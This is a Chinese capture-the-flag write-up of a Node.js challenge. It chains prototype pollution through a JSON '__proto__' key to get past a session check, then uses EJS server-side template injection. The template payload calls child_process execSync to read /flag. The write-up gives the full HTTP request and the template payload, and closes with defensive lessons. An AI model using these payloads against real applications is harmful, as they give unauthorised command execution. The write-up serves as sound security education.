# macguffin

## 题目简述

`/wish` 只有在 `req.session.crying` 为真时才允许访问。首页会把 JSON 请求体的任意键复制到普通对象 `data`，只显式排除了键名 `crying`；给 `__proto__` 赋值即可改变 `data` 的原型，让继承属性 `data.crying` 绕过过滤。进入 `/wish` 后，用户输入又直接进入 `ejs.render`，可用 EJS 模板表达式调用 `child_process` 读取 `/flag`。这是原型链污染与服务端模板注入组成的两段利用链。

## 解题过程

`/wish` 的入口检查很直接：

```javascript
app.all('/wish', (req, res) => {
    if (!req.session.crying) {
        return res.send("forbidden.")
    }
})
```

客户端不能伪造回环地址，所以应继续检查首页对 POST 数据的处理：

```javascript
app.all('/', (req, res) => {
    let data = {name: "", discription: ""}

    if (req.ip === "::ffff:127.0.0.1") {
        data.crying = true
    }

    if (req.method === 'POST') {
        Object.keys(req.body).forEach((key) => {
            if (key !== "crying") {
                data[key] = req.body[key]
            }
        })
    }
})
```

当 `key` 为 `__proto__` 时，`data[key] = value` 会触发对象原型访问器，把 `data` 的原型改成 `value`。因此虽然请求体中没有允许直接复制的 `crying` 键，读取 `data.crying` 时仍会从新原型上得到 `true`。请求必须使用 JSON；若使用表单编码，中间件对嵌套对象的解析行为不同，无法稳定得到题目所需的对象结构。

```http
POST / HTTP/1.1
Host: target
Content-Type: application/json

{"__proto__":{"crying":true},"name":"a","discription":"aa"}
```

官方 PDF 中的示例漏掉了 `discription` 键周围的双引号，不是合法 JSON；上面的版本补正了语法。应用随后把 `data.crying` 写入 session，保持同一会话访问 `/wish` 即可通过检查。

第二段漏洞位于愿望提交逻辑：

```javascript
if (req.method === 'POST') {
    let wishes = req.body.wishes
    req.session.wishes = ejs.render(`<div class="wishes">${wishes}</div>`)
    return res.redirect(302, '/show')
}
```

`${wishes}` 先把输入拼进模板字符串，`ejs.render` 再把其中的 EJS 标签当服务端代码执行。`<%- ... %>` 会把表达式结果不转义地写进页面，可提交：

```ejs
<%- global.process.mainModule.constructor._load('child_process').execSync('cat /flag') %>
```

这里通过 `process.mainModule.constructor._load` 取得 Node.js 的 `child_process` 模块，再以 `execSync` 执行 `cat /flag`。提交后跟随重定向访问 `/show`，命令输出就会出现在渲染结果中。官方 PDF 未记录动态 flag。

## 方法总结

黑名单只拒绝 `crying` 并不能阻止从对象原型继承同名属性；凡是出现 `target[key] = source[key]`，都应检查 `__proto__`、`constructor` 和 `prototype` 是否可控。取得授权状态后还要继续追踪数据流：这里同一个应用又把用户输入作为 EJS 模板而非普通文本渲染，最终从逻辑绕过升级为命令执行。复现时尤其要保证 JSON 语法合法并在两步请求间保持 session。
